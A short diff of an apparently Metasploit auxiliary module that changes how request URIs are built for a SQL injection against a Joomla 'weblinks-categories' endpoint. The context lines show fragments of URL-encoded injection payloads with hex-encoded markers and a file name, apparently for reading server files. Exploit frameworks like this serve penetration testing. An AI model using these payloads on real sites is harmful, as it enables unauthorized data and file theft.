@@ -51,7 +51,7 @@ class Metasploit3 < Msf::Auxiliary
     payload << "AS%20CHAR%29%2C0x20%29%2C0x#{back_marker.unpack('H*')[0]}%29%23"
 
     resp = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, '/index.php/weblinks-categories?id=' + payload)
+      'uri' => normalize_uri(target_uri.path, 'index.php', 'weblinks-categories?id=' + payload)
     })
 
     if !resp or !resp.body
@@ -81,7 +81,7 @@ class Metasploit3 < Msf::Auxiliary
     payload << "0x#{file}%29%29%20AS%20CHAR%29%2C0x20%29%2C0x#{back_marker.unpack('H*')[0]}%29%23"
 
     resp = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, '/index.php/weblinks-categories?id=' + payload)
+      'uri' => normalize_uri(target_uri.path, 'index.php', 'weblinks-categories?id=' + payload)
     })
 
     if !resp or !resp.body
